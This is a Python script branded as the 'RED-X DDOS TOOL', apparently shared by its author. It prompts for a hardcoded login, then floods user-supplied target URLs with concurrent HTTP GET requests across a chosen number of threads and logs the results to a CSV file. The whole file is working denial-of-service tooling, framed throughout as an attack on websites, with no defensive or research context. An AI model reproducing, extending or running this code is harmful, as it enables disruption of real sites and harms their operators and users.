import requests
import time
import colorama
import csv
import threading
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor
import os

# Optional: Background music & Login success sound
try:
    import playsound

    def play_music(file):
        if os.path.exists(file):
            playsound.playsound(file, block=False)
        else:
            print(Fore.RED + f"🎵 {file} not found!")
except ImportError:
    def play_music(file):
        pass  # Ignore if playsound is not installed

# Initialize Colorama
colorama.init(autoreset=True)

# Display logo and developer info (Updated with RED-X)
def display_logo():
    print(Fore.CYAN + """

    ____  __________       _  __
   / __ \/ ____/ __ \     | |/ /
  / /_/ / __/ / / / /_____|   / 
 / _, _/ /___/ /_/ /_____/   |  
/_/ |_/_____/_____/     /_/|_|  
                                
  ==========================
       RED-X DDOS TOOL
  ==========================
  Developed by: MD SOFIKUL ISLAM
  Contact: mrd4rk@gmail.com
  GitHub: github.com/MR-D4RK-OFFICIAL
""")
    
    
# Authorization function
def authorize():
    valid_username = "REDZA-X"
    valid_password = "D4RK"

    print(Fore.YELLOW + "🔐 Authentication required.")
    username = input(Fore.CYAN + "Enter username: ").strip()
    password = input(Fore.CYAN + "Enter password: ").strip()

    if username == valid_username and password == valid_password:
        print(Fore.GREEN + "✅ Access granted! Proceeding...\n")
        play_music("access_granted.mp3")  # Play success sound
        return True
    else:
        print(Fore.RED + "❌ Access denied! Invalid credentials.\n")
        return False

# Function to perform GET requests
def perform_request(session, url, thread_id, response_times, data_sizes):
    try:
        start = time.time()
        response = session.get(url, timeout=5)
        end = time.time()

        response_time = end - start
        response_times.append(response_time)
        data_sizes.append(len(response.content))  # Response size in bytes

        print(Fore.BLUE + f"[Thread-{thread_id}] ✅ Status: {response.status_code} | Time: {response_time:.2f}s | Data: {len(response.content)} bytes")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[Thread-{thread_id}] ❌ Error: {e}")

# Function to initiate load test
def ddos_attack(url, num_threads):
    print(Fore.YELLOW + f"🚀 Starting attack on: {url} with {num_threads} threads.")
    
    session = requests.Session()  # Reuse session for better performance
    response_times = []
    data_sizes = []

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(perform_request, session, url, i+1, response_times, data_sizes) for i in range(num_threads)]

    end_time = time.time()

    print(Fore.GREEN + f"\n✅ Attack completed in {end_time - start_time:.2f} seconds.")
    save_results(response_times, data_sizes, url)

# Function to save results to CSV
def save_results(response_times, data_sizes, url):
    filename = "ddos_attack_results.csv"

    with open(filename, "a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["Thread", "Response Time (sec)", "Data Size (bytes)", "URL"])
        for i in range(len(response_times)):
            writer.writerow([i+1, response_times[i], data_sizes[i], url])

    print(Fore.YELLOW + f"📊 Attack results saved to {filename}")

# Main function
if __name__ == "__main__":
    display_logo()
    
    if not authorize():
        exit(1)

    play_music("background.mp3")  # Start background music (Optional)

    target_urls = input(Fore.CYAN + "🌐 Enter multiple URLs (comma-separated): ").strip().split(",")
    num_threads = int(input(Fore.CYAN + "🔢 Enter number of threads per URL: "))

    for url in target_urls:
        url = url.strip()
        if url:
            print(Fore.YELLOW + f"\n🔹 ATTACKING SITE URL: {url}")
            ddos_attack(url, num_threads)